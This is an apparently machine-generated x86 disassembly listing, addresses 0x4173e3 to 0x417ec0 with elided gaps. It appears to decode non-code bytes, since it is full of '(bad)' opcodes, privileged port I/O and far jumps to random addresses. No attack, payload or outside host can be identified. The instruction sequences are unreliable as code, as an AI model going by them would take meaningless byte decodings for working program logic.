  4173e3:	inc    edi
  4173e4:	pop    edx
  4173e5:	outs   dx,BYTE PTR ds:[esi]
  4173e6:	jae    0x4173f5
  4173e8:	mov    eax,0xd481defc
  4173ed:	mov    bh,ch
  4173ef:	dec    edi
  4173f0:	enter  0x2bc,0xb9
  4173f4:	cli    
  4173f5:	push   es
  4173f6:	xchg   BYTE PTR [eax+ebp*4],bh
  4173f9:	add    BYTE PTR [eax],bl
  4173fb:	out    dx,al
  4173fc:	pop    eax
  4173fd:	mov    bl,0xdb
  4173ff:	sbb    ch,al
  417401:	push   ebx
  417402:	pop    ss
  417403:	call   0x9b1e1b0f
  417408:	hlt    
  417409:	repnz rcl BYTE PTR [edi+0x668ec53b],cl
  417410:	mov    ch,0xc9
  417412:	jne    0x4173d5
  417414:	dec    eax
  417415:	xchg   ecx,eax
  417416:	ss xchg esp,eax
  417418:	xchg   BYTE PTR [edx+ecx*4],al
  41741b:	mov    ah,0x19
  41741d:	cmp    DWORD PTR [esi],0x76537ea1
  417423:	xor    BYTE PTR [ecx-0x11639257],0x33
  41742a:	push   0xde4b0c18
  41742f:	cmp    BYTE PTR [edx+0x74],0x1d
  417433:	leave  
  417434:	cmp    dh,BYTE PTR [eax]
  417436:	and    al,0x2b
  417438:	lods   al,BYTE PTR ds:[esi]
  417439:	mov    esi,0x3ec64c2d
  41743e:	pop    ebp
  41743f:	inc    ecx
  417440:	jp     0x41743c
  417442:	das    
  417443:	ss inc edi
  417445:	mov    eax,0x5105373a
  41744a:	or     eax,0xd7d77bb5
  41744f:	pop    ebp
  417450:	push   0xd
  417452:	mov    gs,edi
  417454:	mov    esp,0xb1f1944d
  41745a:	and    BYTE PTR [eax+0xc],dh
  41745d:	es inc edi
  41745f:	xchg   ebp,eax
  417460:	and    DWORD PTR [esi-0x57c00c3b],edx
  417466:	(bad)  
  417467:	cmp    BYTE PTR [eax-0xa],bh
  41746a:	cmp    BYTE PTR [ebx+0x31],dl
  41746d:	test   eax,0xe6c3eab9
  417472:	test   BYTE PTR [esi+0x2b],0x7a
  417476:	int3   
  417477:	stc    
  417478:	mov    ah,BYTE PTR [eax+0x62]
  41747b:	lods   eax,DWORD PTR ds:[esi]
  41747c:	in     al,0x78
  41747e:	les    esi,FWORD PTR [eax+ebp*1]
  417481:	inc    edx
  417482:	xchg   ebx,eax
  417483:	cli    
  417484:	mov    ch,0x1c
  417486:	test   BYTE PTR [esi],bl
  417488:	ret    0x76a4
  41748b:	not    BYTE PTR [edx+0x1f]
  41748e:	out    0x12,eax
  417490:	mov    al,ds:0xfc601e45
  417495:	or     ch,al
  417497:	mov    cl,BYTE PTR [ebx+eiz*8+0x66]
  41749b:	push   eax
  41749c:	add    eax,ecx
  41749e:	jmp    0x3bfb:0x4917ad71
  4174a5:	ficom  WORD PTR [ebp+0x71]
  4174a8:	scas   eax,DWORD PTR es:[edi]
  4174a9:	mov    DWORD PTR ds:0x1d127df6,0x6053ba47
  4174b3:	retf   0x777e
  4174b6:	fistp  DWORD PTR [edi-0x3b139442]
  4174bc:	fild   DWORD PTR [edx+0x6c]
  4174bf:	or     eax,0x138a
	...
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0x29263b7a
  417542:	mov    eax,0xfe88f4
  417547:	add    dh,dh
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [ebx],dl
  41754d:	or     bl,BYTE PTR [edx]
  41754f:	cs aam 0xa2
  417552:	push   ebx
  417553:	jge    0x417579
  417555:	sbb    al,0x33
  417557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417558:	xor    ebx,edx
  41755a:	in     al,dx
  41755b:	(bad)  
  41755c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41755d:	jb     0x417501
  41755f:	mov    dl,0xaa
  417561:	add    bl,BYTE PTR [edx]
  417563:	jmp    0xbfd8c321
  417568:	or     DWORD PTR [edx],edi
  41756a:	sahf   
  41756b:	inc    ebp
  41756c:	enterw 0xe39d,0x9c
  417571:	xor    ch,BYTE PTR [eax-0x4f]
  417574:	dec    esi
  417575:	imul   ebp,DWORD PTR [ebp-0x66],0x1eab2efa
  41757c:	pop    ds
  41757d:	fcomp  QWORD PTR [ecx]
  41757f:	or     DWORD PTR [ebx+edx*4-0x23],esi
  417583:	jns    0x417513
  417585:	ss push ds
  417587:	test   al,0x4c
  417589:	sub    eax,DWORD PTR [edi+0x2b]
  41758c:	hlt    
  41758d:	pop    edx
  41758e:	push   eax
  41758f:	sahf   
  417590:	mov    dh,0x53
  417592:	sub    BYTE PTR [ebp-0x320af0ce],0xb7
  417599:	and    DWORD PTR [esi+0x5a],edx
  41759c:	and    DWORD PTR [ebx+0x4a],edi
  41759f:	out    dx,al
  4175a0:	or     esp,ebp
  4175a2:	dec    ebp
  4175a3:	ja     0x417579
  4175a5:	inc    eax
  4175a6:	sbb    esi,DWORD PTR [ebx-0x73]
  4175a9:	mov    bh,BYTE PTR [esp+esi*8]
  4175ac:	inc    esp
  4175ad:	js     0x417568
  4175af:	lods   al,BYTE PTR ds:[esi]
  4175b0:	xchg   edi,eax
  4175b1:	ja     0x417617
  4175b3:	inc    edx
  4175b4:	mov    eax,ds:0x5bd267a1
  4175b9:	ja     0x417582
  4175bb:	enter  0xe363,0x40
  4175bf:	lahf   
  4175c0:	(bad)  
  4175c1:	lahf   
  4175c2:	mov    ebx,0xfef5a4a6
  4175c7:	clc    
  4175c8:	mov    edx,0x94db7041
  4175cd:	out    dx,al
  4175ce:	xchg   ebx,eax
  4175cf:	(bad)  
  4175d0:	push   cs
  4175d1:	hlt    
  4175d2:	or     eax,0xfa9463f5
  4175d7:	in     eax,0x95
  4175d9:	xchg   esp,eax
  4175da:	add    DWORD PTR [eax-0x3e594032],0x6f1a06ee
  4175e4:	mov    bl,BYTE PTR [eax]
  4175e6:	push   ds
  4175e7:	popa   
  4175e8:	jg     0x417611
  4175ea:	mov    dh,cl
  4175ec:	mov    esp,DWORD PTR [eax-0x3a]
  4175ef:	jno    0x4175a3
  4175f1:	dec    ecx
  4175f2:	cmp    ebx,DWORD PTR [esi+0x7e434fcb]
  4175f8:	cmp    BYTE PTR ds:0xe52e7915,dl
  4175fe:	sbb    DWORD PTR [ecx+0x64],0xef6cb75b
  417605:	inc    ecx
  417606:	jno    0x417609
  417608:	adc    al,0x2b
  41760a:	out    dx,al
  41760b:	push   esp
  41760c:	lods   eax,DWORD PTR ds:[esi]
  41760d:	jg     0x41762e
  41760f:	mov    esi,0xddb05dc8
  417614:	les    eax,FWORD PTR [eax+0x3c865baa]
  41761a:	push   ebx
  41761b:	push   esi
  41761c:	daa    
  41761d:	sahf   
  41761e:	and    al,0x46
  417620:	fstp   QWORD PTR [ebp-0x32]
  417623:	cvtpi2ps xmm6,QWORD PTR [eax-0x75]
  417627:	sub    eax,0x82eec0b0
  41762c:	and    ebp,DWORD PTR [edi]
  41762e:	fwait
  41762f:	add    eax,0x7fccb34a
  417634:	mov    bl,0xdc
  417636:	add    eax,0xf26beab
  41763b:	retf   0xeeaf
  41763e:	mov    esi,0xd007a0
	...
  4176b3:	add    ah,al
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	mov    ebp,DWORD PTR [ecx]
  4176c2:	mov    BYTE PTR ds:0xff7e,al
  4176c8:	test   BYTE PTR [eax],0x0
  4176cb:	add    BYTE PTR [esi],bh
  4176cd:	xchg   esi,eax
  4176ce:	fidivr DWORD PTR gs:[edx+0x46e3c032]
  4176d5:	retf   0xdda7
  4176d8:	jge    0x4176fb
  4176da:	cmc    
  4176db:	(bad)  
  4176dc:	cmp    DWORD PTR [ecx-0x37fd1203],eax
  4176e2:	mov    eax,ds:0xc0ff0fc8
  4176e7:	imul   edx,DWORD PTR [esi],0xfffffffa
  4176ea:	js     0x41773b
  4176ec:	aaa    
  4176ed:	and    esp,DWORD PTR [ecx-0x2001af13]
  4176f3:	sar    BYTE PTR [eax+0x4f],1
  4176f6:	jmp    0xb2a0ea31
  4176fb:	(bad)  
  4176fc:	(bad)  
  4176fd:	fdivr  st(3),st
  4176ff:	adc    edi,esi
  417701:	dec    ebp
  417702:	pop    ds
  417703:	(bad)  
  417705:	retf   
  417706:	push   ebp
  417707:	pop    ebp
  417708:	stos   BYTE PTR es:[edi],al
  417709:	adc    DWORD PTR [ebx+0x7e],esi
  41770c:	mov    DWORD PTR [edx],edx
  41770e:	arpl   WORD PTR [ebx-0x5378eec5],sp
  417714:	or     bh,0x37
  417717:	inc    esp
  417718:	imul   esi,DWORD PTR [eax+0x47ca3835],0x65258f4c
  417722:	xor    ah,al
  417724:	jp     0x4177a2
  417726:	leave  
  417727:	ins    DWORD PTR es:[edi],dx
  417728:	dec    eax
  417729:	xchg   cl,cl
  41772b:	shl    DWORD PTR [edx],cl
  41772d:	test   BYTE PTR [esp+eax*4+0x34161248],al
  417734:	mov    edi,0xc7b021e7
  417739:	jnp    0x41779b
  41773b:	push   esi
  41773c:	in     eax,dx
  41773d:	rol    esp,1
  41773f:	jo     0x41771b
  417741:	pushf  
  417742:	sahf   
  417743:	pop    ebp
  417744:	and    al,0x7a
  417746:	cmc    
  417747:	jno    0x417751
  417749:	outs   dx,BYTE PTR ds:[esi]
  41774a:	pop    es
  41774b:	pop    eax
  41774c:	xchg   ebx,eax
  41774d:	retf   
  41774e:	or     bl,BYTE PTR [edx+0x4e]
  417751:	std    
  417752:	jne    0x41777d
  417754:	ja     0x4177b1
  417756:	add    eax,0xe3de7f0c
  41775b:	clc    
  41775c:	call   0x65fe:0x52e6f76f
  417763:	in     eax,dx
  417764:	xor    bl,cl
  417766:	imul   edi,esi,0xa9f13650
  41776c:	scas   al,BYTE PTR es:[edi]
  41776d:	nop
  41776e:	pop    esi
  41776f:	cmp    eax,0x1486efb1
  417774:	cmp    BYTE PTR [ebx],al
  417776:	xor    bh,bl
  417778:	mov    eax,0x1b696576
  41777d:	push   ss
  41777e:	popf   
  41777f:	imul   edx,ecx,0x7f
  417782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417783:	leave  
  417784:	fsub   st,st(1)
  417786:	and    al,0x7f
  417788:	cmovnp esi,DWORD PTR [ecx]
  41778b:	lahf   
  41778c:	jno    0x4177cd
  41778e:	outs   dx,DWORD PTR ds:[esi]
  41778f:	and    cl,BYTE PTR [esp+esi*4-0x3e]
  417793:	mov    ch,0x18
  417795:	shr    DWORD PTR [esi],1
  417797:	jbe    0x417777
  417799:	(bad)  
  41779c:	cwde   
  41779d:	loope  0x417763
  41779f:	or     ebp,ecx
  4177a1:	mov    edi,0xcd8c6aae
  4177a6:	js     0x41774f
  4177a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177a9:	jne    0x4177d2
  4177ab:	retf   0xb636
  4177ae:	aam    0x64
  4177b0:	jecxz  0x4177c0
  4177b2:	inc    eax
  4177b3:	test   ah,0x7f
  4177b6:	push   cs
  4177b7:	dec    edx
  4177b8:	sar    BYTE PTR [esi+0x73ec9041],0x60
  4177bf:	pop    ebx
  4177c0:	mov    dh,0xbc
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0xd07d6e99
  417841:	xor    eax,0x749a9d
  417846:	add    DWORD PTR [eax],eax
  417848:	test   BYTE PTR [eax],0x0
  41784b:	add    BYTE PTR [edi],ah
  41784d:	outs   dx,DWORD PTR ds:[esi]
  41784e:	push   0xfb654e67
  417853:	pushf  
  417854:	or     ebx,DWORD PTR [ecx-0xd2451c7]
  41785a:	rol    dh,cl
  41785c:	jmp    0x417845
  41785e:	add    edx,DWORD PTR [edx]
  417860:	(bad)  
  417861:	fwait
  417862:	mov    al,ds:0x35cdaded
  417867:	outs   dx,DWORD PTR ds:[esi]
  417868:	cmp    al,0xf4
  41786a:	push   ebx
  41786b:	arpl   si,cx
  41786d:	imul   BYTE PTR [ebx+0x29]
  417870:	bound  ecx,QWORD PTR [esi+0x1f]
  417873:	fdivr  QWORD PTR [edx]
  417875:	jge    0x417864
  417877:	xor    DWORD PTR [ecx+0xe120fe6],edx
  41787d:	add    DWORD PTR [edi-0x382dba35],esi
  417883:	cmp    al,0x72
  417885:	or     DWORD PTR [edi-0x2d70585d],0x8b8e4d3c
  41788f:	or     al,0x17
  417891:	pop    ds
  417892:	and    dl,BYTE PTR [ecx-0x65]
  417895:	mov    BYTE PTR [ebx],dh
  417897:	call   0x3fed531d
  41789c:	jbe    0x4178b8
  41789e:	adc    BYTE PTR [esi+0x59],ah
  4178a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178a2:	sub    DWORD PTR [edi+0xf],ebp
  4178a5:	and    dh,BYTE PTR [ebx-0x50]
  4178a8:	mov    eax,ds:0xbc369b3a
  4178ad:	and    bh,BYTE PTR [ecx]
  4178af:	or     eax,0xc7bc875c
  4178b4:	(bad)  
  4178b5:	mov    edi,0x96739e65
  4178ba:	in     eax,dx
  4178bb:	in     al,0x75
  4178bd:	(bad)  
  4178be:	outs   dx,DWORD PTR ds:[esi]
  4178bf:	dec    edx
  4178c0:	lds    esp,FWORD PTR [eax]
  4178c2:	mov    bx,0xb7e
  4178c6:	xor    ebx,DWORD PTR ds:0x49c8f783
  4178cc:	outs   dx,BYTE PTR ds:[esi]
  4178cd:	(bad)  
  4178ce:	sahf   
  4178cf:	fs jl  0x417865
  4178d2:	cwde   
  4178d3:	ds jo  0x4178d6
  4178d6:	sbb    al,0x7f
  4178d8:	inc    edi
  4178d9:	sub    ebx,0x9aa26826
  4178df:	adc    ebx,DWORD PTR [esi]
  4178e1:	dec    ebx
  4178e2:	xor    DWORD PTR [esi-0x3d],ebp
  4178e5:	sbb    al,0xa6
  4178e7:	ror    DWORD PTR gs:[esi],cl
  4178ea:	fnstsw ax
  4178ec:	mov    eax,0x317dcaa0
  4178f1:	retf   
  4178f2:	jno    0x4178fa
  4178f4:	mov    DWORD PTR [edi+0x7a],esi
  4178f7:	leave  
  4178f8:	add    ebp,esp
  4178fa:	or     al,BYTE PTR [edx+esi*8]
  4178fd:	inc    ebx
  4178fe:	add    al,0x3d
  417900:	push   edi
  417901:	adc    dl,BYTE PTR [esi+esi*8]
  417904:	jae    0x4178f1
  417906:	dec    eax
  417907:	mov    cl,0xc1
  417909:	adc    eax,DWORD PTR [ebp-0x1027e341]
  41790f:	sub    BYTE PTR [edx-0x43],al
  417912:	out    dx,eax
  417913:	in     eax,0x92
  417915:	rol    DWORD PTR es:[ecx],0x17
  417919:	xchg   esp,eax
  41791a:	ds cli 
  41791c:	add    dh,BYTE PTR [ebx]
  41791e:	(bad)  
  41791f:	pusha  
  417920:	sbb    al,0x62
  417922:	je     0x4178c8
  417924:	icebp  
  417925:	das    
  417926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417927:	xor    ebx,DWORD PTR [ebx+0x21]
  41792a:	mov    al,0x74
  41792c:	popa   
  41792d:	dec    esp
  41792e:	icebp  
  41792f:	iret   
  417930:	mov    edx,?
  417932:	adc    BYTE PTR ds:0xc74851eb,al
  417938:	pop    es
  417939:	pop    eax
  41793a:	pusha  
  41793b:	ins    DWORD PTR es:[edi],dx
  41793c:	test   al,0xf4
  41793e:	push   ds
  41793f:	push   ebx
  417940:	repz add BYTE PTR fs:[eax],al
	...
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi-0x32fe3680]
  4179c2:	jo     0x4179f9
  4179c4:	push   0x1
  4179c6:	add    DWORD PTR [eax],eax
  4179c8:	test   BYTE PTR [eax],0x0
  4179cb:	add    ch,ah
  4179cd:	scas   al,BYTE PTR es:[edi]
  4179ce:	cmp    bh,BYTE PTR [esi+0x4855ac1d]
  4179d4:	mov    eax,ds:0x7d77f201
  4179d9:	dec    ebx
  4179da:	mov    ebp,0x93d86fc
  4179df:	repz out dx,eax
  4179e1:	pop    ss
  4179e2:	or     cl,cl
  4179e4:	out    dx,eax
  4179e5:	add    eax,0xc310e37b
  4179ea:	shl    dh,0xa9
  4179ed:	xor    al,0xf9
  4179ef:	mov    eax,0xe10e0c96
  4179f4:	cs stc 
  4179f6:	fidivr DWORD PTR [esp+edi*4]
  4179f9:	retf   0xfe9
  4179fc:	jmp    0xdd83:0xaa936981
  417a03:	scas   al,BYTE PTR es:[edi]
  417a04:	fucom  st(4)
  417a06:	jecxz  0x417a1e
  417a08:	sbb    esp,ecx
  417a0a:	int3   
  417a0b:	xchg   ecx,eax
  417a0c:	aad    0x67
  417a0e:	sub    bl,BYTE PTR [edx+0x9]
  417a11:	sbb    BYTE PTR [ecx-0x13122a2f],cl
  417a17:	not    BYTE PTR [edi+eiz*2-0x7363e5d0]
  417a1e:	xor    al,0x93
  417a20:	dec    ecx
  417a21:	out    dx,al
  417a22:	das    
  417a23:	xor    BYTE PTR [edx-0x51825391],cl
  417a29:	int    0xfe
  417a2b:	inc    edi
  417a2c:	js     0x417a6d
  417a2e:	or     bl,BYTE PTR [ebx]
  417a30:	fwait
  417a31:	(bad)  
  417a32:	(bad)  
  417a33:	mov    eax,ds:0x34e9b4d8
  417a38:	xchg   esp,eax
  417a39:	cdq    
  417a3a:	jmp    0x1604:0xf89e9d4c
  417a41:	cmp    BYTE PTR [ecx],bl
  417a43:	sbb    eax,0xbfac7dfa
  417a48:	mov    al,0x15
  417a4a:	sub    ecx,esi
  417a4c:	adc    al,BYTE PTR [esi]
  417a4e:	ret    
  417a4f:	popa   
  417a50:	mov    al,0xb9
  417a52:	xchg   edi,eax
  417a53:	push   edi
  417a54:	dec    ebp
  417a55:	(bad)  
  417a56:	stos   DWORD PTR es:[edi],eax
  417a57:	ror    BYTE PTR [esi+0x547df1eb],1
  417a5d:	test   dh,0xe7
  417a60:	jno    0x417a86
  417a62:	pop    ebp
  417a63:	sbb    edi,DWORD PTR [edx+0x6473455b]
  417a69:	cdq    
  417a6a:	aam    0x75
  417a6c:	std    
  417a6d:	fnsave [ebx+0x19]
  417a70:	mov    bh,0xe4
  417a72:	mov    ?,WORD PTR [ecx+ecx*1+0x17b95ad]
  417a79:	xchg   ebx,eax
  417a7a:	ins    DWORD PTR es:[edi],dx
  417a7b:	(bad)  
  417a7c:	mov    esi,DWORD PTR [edi+0x69845472]
  417a82:	into   
  417a83:	pop    DWORD PTR [esi-0x3f87dd7c]
  417a89:	or     eax,0xfb01d190
  417a8e:	sub    BYTE PTR [esi-0x33c8aec],al
  417a94:	mov    bl,0x1e
  417a96:	inc    edx
  417a97:	jl     0x417ad7
  417a99:	jg     0x417af2
  417a9b:	das    
  417a9c:	scas   eax,DWORD PTR es:[edi]
  417a9d:	popf   
  417a9e:	stos   BYTE PTR es:[edi],al
  417a9f:	and    ch,BYTE PTR [ebx]
  417aa1:	xlat   BYTE PTR ds:[ebx]
  417aa2:	cmp    DWORD PTR [esi+0x413ddcad],ebx
  417aa8:	outs   dx,BYTE PTR ds:[esi]
  417aa9:	mov    ebx,0x7344194b
  417aae:	in     eax,dx
  417aaf:	dec    esp
  417ab0:	xchg   esp,eax
  417ab1:	inc    esi
  417ab2:	test   BYTE PTR [edi],cl
  417ab4:	pop    edx
  417ab5:	push   ebx
  417ab6:	sbb    BYTE PTR [ebx],bh
  417ab8:	lahf   
  417ab9:	dec    edx
  417aba:	daa    
  417abb:	stc    
  417abc:	and    DWORD PTR [ecx],0x3f6f1142
	...
  417b32:	add    BYTE PTR [eax],al
  417b34:	jecxz  0x417b9b
  417b36:	push   cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x62fef5f7
  417b41:	dec    esp
  417b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b43:	inc    ecx
  417b44:	pusha  
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    dh,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR ds:0xd7ada41d,al
  417b51:	lahf   
  417b52:	in     eax,dx
  417b53:	bound  esp,QWORD PTR [eax+0x22]
  417b56:	jg     0x417bc5
  417b58:	mov    esi,esp
  417b5a:	(bad)  
  417b5b:	int3   
  417b5c:	out    0x62,al
  417b5e:	inc    ecx
  417b5f:	ret    
  417b60:	(bad)  
  417b61:	mov    eax,0xf61b717e
  417b66:	popa   
  417b67:	aam    0xc0
  417b69:	mov    eax,DWORD PTR [ecx]
  417b6b:	in     al,dx
  417b6c:	cmp    eax,0x709d579a
  417b71:	(bad)  
  417b72:	mov    ebx,0xf5b0b932
  417b77:	mov    cl,0xec
  417b79:	outs   dx,DWORD PTR ds:[esi]
  417b7a:	jne    0x417b1d
  417b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7d:	xchg   esi,eax
  417b7e:	clc    
  417b7f:	call   0x9e93ce37
  417b84:	into   
  417b85:	fstp   st(1)
  417b87:	or     eax,0x41092820
  417b8c:	mov    ebx,DWORD PTR [edi]
  417b8e:	cmp    eax,0x76a248f
  417b93:	xor    eax,0xf05dc1d5
  417b98:	pop    esp
  417b99:	stos   BYTE PTR es:[edi],al
  417b9a:	sub    edx,DWORD PTR [edi-0x2d]
  417b9d:	xchg   edi,eax
  417b9e:	sub    esp,DWORD PTR [ebx-0x3aa3b7ee]
  417ba4:	repz sub ah,BYTE PTR [esp+eiz*4]
  417ba8:	dec    ecx
  417ba9:	retf   
  417baa:	pop    es
  417bab:	aad    0xa3
  417bad:	clc    
  417bae:	sets   BYTE PTR [ebx]
  417bb1:	jle    0x417b76
  417bb3:	rol    BYTE PTR [edx+ecx*4],0x2d
  417bb7:	push   esp
  417bb8:	outs   dx,BYTE PTR ds:[esi]
  417bb9:	arpl   bx,bp
  417bbb:	cli    
  417bbc:	or     ebx,DWORD PTR [edx]
  417bbe:	pop    edi
  417bbf:	(bad)  
  417bc0:	fwait
  417bc1:	into   
  417bc2:	daa    
  417bc3:	or     BYTE PTR [ecx],dh
  417bc5:	cmp    dl,ch
  417bc7:	mov    ebp,0x3ed7e793
  417bcc:	or     esp,esi
  417bce:	mov    dh,0xee
  417bd0:	mov    eax,0x49bef9ef
  417bd5:	mov    bl,0xc5
  417bd7:	sub    eax,0x73d38705
  417bdc:	push   cs
  417bdd:	xchg   ecx,eax
  417bde:	not    ch
  417be0:	dec    ecx
  417be1:	push   0x2794dd9d
  417be6:	cmp    eax,0x93546114
  417beb:	ja     0x417bbd
  417bed:	pop    esp
  417bee:	push   ds
  417bef:	leave  
  417bf0:	and    BYTE PTR [ebx],al
  417bf2:	add    eax,0x4b8d30ed
  417bf7:	repz les esi,FWORD PTR [eax]
  417bfa:	test   eax,0x73239867
  417bff:	call   0x38983347
  417c04:	scas   al,BYTE PTR es:[edi]
  417c05:	push   edx
  417c06:	push   esp
  417c07:	mov    ch,0x98
  417c09:	pop    ds
  417c0a:	pushf  
  417c0b:	loopne 0x417c52
  417c0d:	sar    DWORD PTR [edi+0xb99b500],cl
  417c13:	push   esi
  417c14:	push   0x98ba3098
  417c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c1a:	mov    ds:0x876c6574,al
  417c1f:	jmp    0xa351:0xae1fed3b
  417c26:	fisttp WORD PTR [esi-0x1e6f1469]
  417c2c:	or     BYTE PTR [ebx-0x70],0xf0
  417c30:	repnz adc BYTE PTR [ebx+0x38d4f835],cl
  417c37:	and    bh,BYTE PTR es:[eax-0x19]
  417c3b:	xor    eax,0x701a5b4d
  417c40:	xchg   ebx,eax
  417c41:	hlt    
	...
  417cb2:	add    BYTE PTR [eax],al
  417cb4:	and    DWORD PTR [ebx-0x40445077],edx
  417cba:	daa    
  417cbb:	lahf   
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [edi],edi
  417cc1:	add    ecx,ecx
  417cc3:	mov    ss,WORD PTR [esi+0x3]
  417cc6:	add    DWORD PTR [eax],eax
  417cc8:	test   BYTE PTR [eax],0x0
  417ccb:	add    BYTE PTR [edx-0x72a51438],al
  417cd1:	les    ebx,FWORD PTR [esi+0xe]
  417cd4:	fsubr  st,st(7)
  417cd6:	cdq    
  417cd7:	fiadd  WORD PTR [edx+ecx*1+0x3527ba42]
  417cde:	mov    al,0x6e
  417ce0:	mov    ebx,0x4beecba5
  417ce5:	xchg   dh,dl
  417ce7:	sub    edi,esi
  417ce9:	sbb    ecx,edx
  417ceb:	jge    0x417d45
  417ced:	(bad)  
  417cee:	into   
  417cef:	out    0x2e,al
  417cf1:	mul    DWORD PTR ds:[eax+0x1]
  417cf5:	mov    bh,0x17
  417cf7:	fwait
  417cf8:	xor    BYTE PTR [edi-0x7412f913],ah
  417cfe:	xor    BYTE PTR [eax],0x14
  417d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d02:	xor    esp,DWORD PTR [edx-0x243bd463]
  417d08:	ins    DWORD PTR es:[edi],dx
  417d09:	xchg   DWORD PTR ds:0x32bf3463,ebp
  417d0f:	call   0xb833b472
  417d14:	xchg   esp,esi
  417d16:	stc    
  417d17:	mov    esi,0x5ef3fa35
  417d1c:	test   eax,0x25788a7b
  417d21:	out    dx,al
  417d22:	dec    ecx
  417d23:	pop    edx
  417d24:	(bad)  
  417d25:	int    0x7f
  417d27:	mov    edx,DWORD PTR [esp+edi*8]
  417d2a:	in     eax,0xc3
  417d2c:	clc    
  417d2d:	jle    0x417d38
  417d2f:	pop    ebp
  417d30:	imul   ebx,DWORD PTR [ebp+ecx*8-0x7c46491b],0x2212843f
  417d3b:	into   
  417d3c:	pop    ecx
  417d3d:	xchg   ecx,eax
  417d3e:	(bad)  [esi-0x5607af41]
  417d44:	lods   eax,DWORD PTR ds:[esi]
  417d45:	mov    cl,0x1c
  417d47:	not    cl
  417d49:	sub    al,BYTE PTR [edx]
  417d4b:	jns    0x417d83
  417d4d:	cmp    BYTE PTR [edi+0x3e9648cb],ah
  417d53:	pop    edx
  417d54:	jne    0x417d6f
  417d56:	mov    al,0xc
  417d58:	ins    DWORD PTR es:[edi],dx
  417d59:	or     eax,0x73f6c88d
  417d5e:	jnp    0x417dc4
  417d60:	stc    
  417d61:	clc    
  417d62:	rol    DWORD PTR [eax+eiz*2+0x414527c7],cl
  417d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6a:	adc    bl,BYTE PTR ds:0xf0257552
  417d70:	dec    edi
  417d71:	push   es
  417d72:	xchg   DWORD PTR [edi],esp
  417d74:	cmc    
  417d75:	out    0x32,al
  417d77:	bound  esi,QWORD PTR [ecx-0x79]
  417d7a:	mov    cl,0x35
  417d7c:	push   edx
  417d7d:	sbb    al,0xe9
  417d7f:	pop    ss
  417d80:	adc    eax,0xd60f881b
  417d85:	aam    0x48
  417d87:	cli    
  417d88:	sub    al,0x88
  417d8a:	mov    eax,0x4259d46b
  417d8f:	or     eax,0x482d9045
  417d94:	add    DWORD PTR [ecx-0xce13468],esp
  417d9a:	xor    dl,BYTE PTR [ebp+0x5581ff68]
  417da0:	retf   0xff65
  417da3:	mov    eax,0xadf0f97d
  417da8:	adc    al,0xf1
  417daa:	pop    esi
  417dab:	mov    WORD PTR [ebx+0x446d65f],gs
  417db1:	xor    al,0x95
  417db3:	rol    BYTE PTR [ebx+0x684daef0],0xa8
  417dba:	cdq    
  417dbb:	fisubr WORD PTR [ebp+0x4316e79]
  417dc1:	xchg   ebx,eax
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	add    al,0x77
  417e42:	xchg   edi,eax
  417e43:	out    0x4c,al
  417e45:	add    al,0x1
  417e47:	add    dh,dh
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [eax+0xd],bh
  417e4e:	xor    DWORD PTR [edi+eax*1+0x16],edx
  417e52:	or     al,0x16
  417e54:	rcl    DWORD PTR ds:0xc4583ca9,0xde
  417e5b:	test   DWORD PTR [eax],esi
  417e5d:	inc    ebx
  417e5e:	shr    BYTE PTR [eax+0x37],1
  417e61:	pop    ecx
  417e62:	sub    eax,0xf25c0c26
  417e67:	outs   dx,BYTE PTR ds:[esi]
  417e68:	xchg   edi,eax
  417e69:	and    DWORD PTR [edi-0x49],0xffffffa3
  417e6d:	mov    ds:0xf7ad3215,al
  417e72:	mov    eax,fs:0xfd313079
  417e78:	std    
  417e79:	mov    edi,0x9e153082
  417e7e:	xchg   BYTE PTR [ebp-0x6c],dl
  417e81:	fnsave [ebx+ebp*8-0x46]
  417e85:	xor    eax,0x9fef33ba
  417e8a:	aam    0xe5
  417e8c:	fdivr  DWORD PTR [edx]
  417e8e:	inc    eax
  417e8f:	ja     0x417e91
  417e91:	imul   ebx,DWORD PTR ds:0xc14032,0x47143c22
  417e9b:	bound  ebp,QWORD PTR [edx-0x50644eed]
  417ea1:	xchg   ebp,eax
  417ea2:	jb     0x417e4b
  417ea4:	popf   
  417ea5:	or     al,0x53
  417ea7:	loope  0x417e58
  417ea9:	inc    esp
  417eaa:	sbb    BYTE PTR [ebp-0x6],0x9a
  417eae:	ret    
  417eaf:	mov    eax,ds:0x3bb51072
  417eb4:	test   ch,0x72
  417eb7:	daa    
  417eb8:	jb     0x417f21
  417eba:	lahf   
  417ebb:	mov    ecx,0x4bcaf9de
  417ec0:	mov    ecx,DWORD PTR [edi-0x64]
